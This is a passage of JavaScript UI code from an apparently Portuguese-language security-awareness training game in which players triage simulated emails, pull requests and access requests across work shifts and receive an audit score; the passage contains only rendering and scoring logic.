      }
    });

    this.btnRestartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.auditReportView.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });
  }

  switchToAppView(view) {
    this.currentAppView = view;
    if (view === 'word') {
      this.tabBtnMailview.classList.remove('active-tab');
      this.tabBtnWordview.classList.add('active-tab');
      this.appWorkspaceBody.style.display = 'none';
      this.wordDocView.style.display = 'flex';
      this.browserUrlBar.value = 'file:///C:/TechCore/Documentos/Procedimentos_TI_TechCore.doc';
      this.renderWordContent();
    } else {
      this.tabBtnWordview.classList.remove('active-tab');
      this.tabBtnMailview.classList.add('active-tab');
      this.wordDocView.style.display = 'none';
      this.appWorkspaceBody.style.display = 'flex';
      this.browserUrlBar.value = this.getCurrentShift().url;
    }
  }

  renderWordContent() {
    const shift = this.getCurrentShift();
    this.wordDocContent.innerHTML = shift.wordContent;
  }

  openCeoDialogueForShift(shiftIndex) {
    this.currentShiftIndex = shiftIndex;
    this.currentDialogIndex = 0;
    const shift = this.getCurrentShift();

    this.ceoDialogTitlebar.textContent = `📡 CANAL_DIRETORIA // BRIEFING_TURNO_${shift.shiftNumber}_ROGERIO_CEO`;
    this.ceoDialogSpeakerTag.textContent = `📟 COMUNICADO DO CEO ROGÉRIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    
    this.renderDialogueStep();
    this.ceoDialogModal.style.display = 'flex';
  }

  renderDialogueStep() {
    const shift = this.getCurrentShift();
    const dialog = shift.ceoDialogues[this.currentDialogIndex];
    this.ceoSpeechText.innerHTML = dialog.text;
    this.dialogStepIndicator.textContent = `Mensagem ${dialog.step} de ${shift.ceoDialogues.length}`;

    this.btnDialogPrev.style.display = this.currentDialogIndex > 0 ? 'inline-flex' : 'none';
    
    if (this.currentDialogIndex === shift.ceoDialogues.length - 1) {
      this.btnDialogNext.style.display = 'none';
      this.btnStartWorkstationFromDialog.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.textContent = `🚀 Iniciar Turno ${shift.shiftNumber} (09:00)`;
    } else {
      this.btnDialogNext.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.style.display = 'none';
    }
  }

  startShiftExecution() {
    const shift = this.getCurrentShift();
    this.startScreen.style.display = 'none';
    this.mainWorkspace.style.display = 'flex';
    this.processedItems = [];
    this.decisionsHistory = [];
    this.currentCategoryFilter = 'all';

    this.switchToAppView('mail');

    // Update Header
    this.shiftPillBadge.textContent = `TURNO ${shift.shiftNumber}/4`;
    this.browserTabIcon.textContent = shift.brandIcon;
    this.browserTabTitle.textContent = `${shift.brandName} - Turno ${shift.shiftNumber} (${shift.scenarios.length} itens)`;
    this.browserUrlBar.value = shift.url;
    this.appBrandIcon.textContent = shift.brandIcon;
    this.appBrandName.textContent = shift.brandName;
    this.taskbarActiveTitle.textContent = `${shift.brandIcon} ${shift.brandName} - Turno ${shift.shiftNumber}`;

    // Show/hide apps in sidebar & tabs based on shift
    this.folderDbRow.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';
    this.tabBtnDb.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';

    this.folderZapRow.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';
    this.tabBtnZap.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';

    this.folderVaultRow.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';
    this.tabBtnVault.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';

    this.updateBadges();
    this.showInboxList();
    this.renderInboxRows();
  }

  setCategoryView(view) {
    this.currentCategoryFilter = view;

    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(i => {
      i.classList.toggle('active', i.getAttribute('data-view') === view);
    });

    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(t => {
      t.classList.toggle('active', t.getAttribute('data-cat') === view);
    });

    this.showInboxList();
    this.renderInboxRows();
  }

  showInboxList() {
    this.emailReaderView.style.display = 'none';
    this.auditReportView.style.display = 'none';
    this.inboxListView.style.display = 'flex';
    this.renderInboxRows();
  }

  updateBadges() {
    const shift = this.getCurrentShift();
    const unread = shift.scenarios.filter((_, idx) => !this.processedItems.includes(idx));
    
    const unreadEmail = unread.filter(s => s.channel === 'email').length;
    const unreadGithub = unread.filter(s => s.channel === 'github').length;
    const unreadIam = unread.filter(s => s.channel === 'iam').length;
    const unreadDb = unread.filter(s => s.channel === 'db').length;
    const unreadZap = unread.filter(s => s.channel === 'zap').length;
    const unreadVault = unread.filter(s => s.channel === 'vault').length;

    this.badgeEmailCount.textContent = unreadEmail;
    this.badgeGithubCount.textContent = unreadGithub;
    this.badgeIamCount.textContent = unreadIam;
    this.badgeDbCount.textContent = unreadDb;
    this.badgeZapCount.textContent = unreadZap;
    this.badgeVaultCount.textContent = unreadVault;
    this.badgeDoneCount.textContent = this.processedItems.length;

    this.tabEmailTag.textContent = `${unreadEmail} novos`;
    this.tabGithubTag.textContent = `${unreadGithub} novos`;
    this.tabIamTag.textContent = `${unreadIam} novos`;
    if (this.tabDbTag) this.tabDbTag.textContent = `${unreadDb} novos`;
    if (this.tabZapTag) this.tabZapTag.textContent = `${unreadZap} novos`;
    if (this.tabVaultTag) this.tabVaultTag.textContent = `${unreadVault} novos`;
    
    const activeItem = shift.scenarios[this.processedItems.length] || shift.scenarios[shift.scenarios.length - 1];
    const timeStr = this.processedItems.length >= shift.scenarios.length ? '18:00' : activeItem.time;
    this.shiftClock.textContent = timeStr;
    this.taskbarClock.textContent = timeStr;
  }

  renderInboxRows() {
    this.emailItemsContainer.innerHTML = '';
    const shift = this.getCurrentShift();

    shift.scenarios.forEach((item, index) => {
      const isProcessed = this.processedItems.includes(index);

      if (this.currentCategoryFilter === 'processed') {
        if (!isProcessed) return;
      } else if (this.currentCategoryFilter !== 'all' && item.channel !== this.currentCategoryFilter) {
        return;
      }

      const row = document.createElement('div');
      row.className = `email-row-item ${!isProcessed ? 'unread' : 'processed'}`;
      
      let tagLabel = 'TechMail';
      let tagClass = 'tag-email';
      if (item.channel === 'github') { tagLabel = 'GitHub PR'; tagClass = 'tag-github'; }
      if (item.channel === 'iam') { tagLabel = 'IAM Access'; tagClass = 'tag-iam'; }
      if (item.channel === 'db') { tagLabel = 'TechDB SQL'; tagClass = 'tag-db'; }
      if (item.channel === 'zap') { tagLabel = 'TechZap Chat'; tagClass = 'tag-zap'; }
      if (item.channel === 'vault') { tagLabel = 'TechVault'; tagClass = 'tag-vault'; }

      row.innerHTML = `
        <div class="row-controls">
          <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
          <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">★</span>
        </div>
        <span class="row-tag ${tagClass}">${tagLabel}</span>
        <div class="row-sender">${this.escapeHtml(item.senderName)}</div>
        <div class="row-content">
          ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
          <span class="row-subject">${this.escapeHtml(item.subject)}</span>
          <span class="row-snippet"> - ${this.escapeHtml(item.snippet)}</span>
        </div>
        <div class="row-time">${item.time}</div>
      `;

      row.addEventListener('click', () => {
        audio.openMail();
        this.openReader(index);
      });

      this.emailItemsContainer.appendChild(row);
    });

    if (this.emailItemsContainer.children.length === 0) {
      this.emailItemsContainer.innerHTML = `
        <div style="padding: 40px; text-align: center; color: #747775;">
          <div style="font-size: 32px; margin-bottom: 8px;">📭</div>
          <p>Nenhum item nesta fila de exibição.</p>
        </div>
      `;
    }
  }

  openReader(index) {
    const shift = this.getCurrentShift();
    const item = shift.scenarios[index];
    const isProcessed = this.processedItems.includes(index);

    this.inboxListView.style.display = 'none';
    this.emailReaderView.style.display = 'flex';
    this.technicalHeadersBox.style.display = 'none';
    this.btnToggleHeaders.textContent = 'Detalhes de Segurança ▾';

    let typeText = 'E-MAIL CORPORATIVO';
    if (item.channel === 'github') typeText = 'GITHUB PULL REQUEST';
    if (item.channel === 'iam') typeText = 'CHAMADO DE ACESSO IAM';
    if (item.channel === 'db') typeText = 'AUDITORIA DE BANCO TECHDB';
    if (item.channel === 'zap') typeText = 'TECHZAP WHATSAPP CHAT';
    if (item.channel === 'vault') typeText = 'DESPACHO TECHVAULT';

    this.readerTypeTag.textContent = typeText;
    this.readerTimeMeta.textContent = item.time;
    this.readerSubjectTitle.textContent = item.subject;

    this.readerSenderAvatar.textContent = item.avatarChar;
    this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
    this.readerSenderName.textContent = item.senderName;
    this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
    this.readerReceivedTime.textContent = item.meta['Data'] || item.time;

    this.headerDe.textContent = item.meta['De'] || item.meta['Origem'] || item.meta['Contato'] || item.meta['Arquivo'] || '-';
    this.headerPara.textContent = item.meta['Para'] || item.meta['Endpoint'] || item.meta['Destino'] || '-';
    this.headerData.textContent = item.meta['Data'] || '-';
    this.headerAuth.textContent = item.meta['Segurança'] || item.meta['Status'] || item.meta['Prioridade'] || '-';

    this.readerBodyMessage.innerHTML = item.body;

    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
        </div>
      `;
    }

    // Render Decision Buttons (Neutral without red/green clues)
    if (isProcessed) {
      this.decisionButtonsGroup.innerHTML = `
        <div style="font-size: 13px; color: #475569; font-weight: 600;">
          ✓ Este item já foi processado anteriormente durante este expediente.
        </div>
      `;
    } else {
      this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
        return `
          <button class="btn-decision" data-action-id="${action.id}">
            ${action.label}
          </button>
        `;
      }).join('');

      this.decisionButtonsGroup.querySelectorAll('.btn-decision').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const actionId = e.currentTarget.getAttribute('data-action-id');
          const chosenAction = item.actions.find(a => a.id === actionId);
          this.processAction(index, item, chosenAction);
        });
      });
    }
  }

  processAction(index, item, action) {
    audio.actionDone();

    this.processedItems.push(index);
    const decisionRecord = {
      shiftNumber: this.getCurrentShift().shiftNumber,
      scenarioIndex: index,
      channel: item.channel,
      subject: item.subject,
      chosenActionLabel: action.label,
      logTitle: action.logTitle,
      correct: action.correct,
      consequence: action.consequence,
      explanation: action.explanation
    };

    this.decisionsHistory.push(decisionRecord);
    this.campaignHistory.push(decisionRecord);

    this.showToast(action.toastMsg);
    this.updateBadges();

    const shift = this.getCurrentShift();
    if (this.processedItems.length >= shift.scenarios.length) {
      setTimeout(() => {
        this.showShiftAuditReport();
      }, 700);
    } else {
      setTimeout(() => {
        this.showInboxList();
      }, 500);
    }
  }

  showToast(msg) {
    this.toastMsg.textContent = msg;
    this.actionToast.style.display = 'flex';
    setTimeout(() => {
      this.actionToast.style.display = 'none';
    }, 2400);
  }

  showShiftAuditReport() {
    audio.endFanfare();

    this.emailReaderView.style.display = 'none';
    this.inboxListView.style.display = 'none';
    this.auditReportView.style.display = 'flex';
    this.shiftClock.textContent = '18:00';
    this.taskbarClock.textContent = '18:00';

    const shift = this.getCurrentShift();
    const isFinalShift = this.currentShiftIndex === CAMPAIGN_SHIFTS.length - 1;

    const totalScenarios = this.decisionsHistory.length;
    const correctCount = this.decisionsHistory.filter(d => d.correct).length;
    const incorrectCount = totalScenarios - correctCount;

    // Tolerance: Up to 2 errors allowed to pass
    const isApproved = incorrectCount <= 2;

    const health = Math.max(0, 100 - (incorrectCount * 20));
    const reputation = Math.max(0, 100 - (incorrectCount * 12) + (correctCount * 6));

    this.reportThreatsAvoided.textContent = correctCount;
    this.reportThreatsTaken.textContent = incorrectCount;
    this.reportHealthFinal.textContent = `${health}%`;
    this.reportHealthFinal.className = health >= 60 ? 'card-num text-emerald' : 'card-num text-danger';
    this.reportReputationFinal.textContent = `${reputation} pts`;

    this.auditStamp.textContent = `TECHCORE CISO AUDIT // TURNO ${shift.shiftNumber}`;
    this.auditTitle.textContent = isFinalShift 
      ? '🏆 RELATÓRIO FINAL DA CAMPANHA DE DEFESA (4 TURNOS)' 
      : `Relatório de Desempenho - ${shift.title}`;
    this.auditSubText.textContent = `Expediente encerrado às 18:00. Avaliação do Turno ${shift.shiftNumber} de 4 (Tolerância: até 2 erros permitidos).`;

    if (incorrectCount === 0) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Aprovado com Louvor no Turno ${shift.shiftNumber}!`;
      this.auditVerdictText.textContent = 'Desempenho 100% perfeito! Você neutralizou todas as ameaças sem nenhum falso positivo ou incidente cibernético.';
    } else if (isApproved) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Turno ${shift.shiftNumber} APROVADO (Dentro da Margem de Tolerância de 2 Erros)`;
      this.auditVerdictText.textContent = `Você teve ${incorrectCount} incidente(s), mas manteve a infraestrutura sob controle e está plenamente autorizado a prosseguir na campanha!`;
    } else {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Reprovado no Turno ${shift.shiftNumber} (Mais de 2 Erros)`;
      this.auditVerdictText.textContent = `Você cometeu ${incorrectCount} erros críticos, ultrapassando o limite tolerado de 2 falhas. A integridade da empresa foi comprometida.`;
    }

    if (!isFinalShift) {
      const nextShiftNum = shift.shiftNumber + 1;
      this.btnNextShiftAction.style.display = 'inline-flex';
      this.btnNextShiftAction.textContent = isApproved 
        ? `▶ Avançar para o Turno ${nextShiftNum} (${CAMPAIGN_SHIFTS[this.currentShiftIndex + 1].brandName})` 
        : `🔄 Repetir Turno ${shift.shiftNumber}`;
      this.btnRestartShift.style.display = 'none';
    } else {
      this.btnNextShiftAction.style.display = 'none';
      this.btnRestartShift.style.display = 'inline-flex';
      this.btnRestartShift.textContent = '🔄 Reiniciar Campanha Completa (Do Turno 1)';
    }

    this.auditTableBody.innerHTML = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="row-tag tag-${item.channel}">${item.channel.toUpperCase()}</span></td>
        <td><strong>${this.escapeHtml(item.subject)}</strong></td>
        <td>${this.escapeHtml(item.chosenActionLabel)}</td>
        <td><strong style="color: ${item.correct ? 'var(--google-green)' : 'var(--google-red)'};">${item.correct ? '✅ ACERTO' : '❌ INCIDENTE'}</strong></td>
        <td style="font-size: 11.5px; color: #444746; line-height: 1.4;">
          <strong>${this.escapeHtml(item.logTitle)}:</strong> ${this.escapeHtml(item.consequence)}<br>
          <em style="color: #747775;">${this.escapeHtml(item.explanation)}</em>
        </td>
      </tr>
    `).join('');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Start Simulator
window.addEventListener('DOMContentLoaded', () => {
  window.simulator = new TechMailSimulator();
});
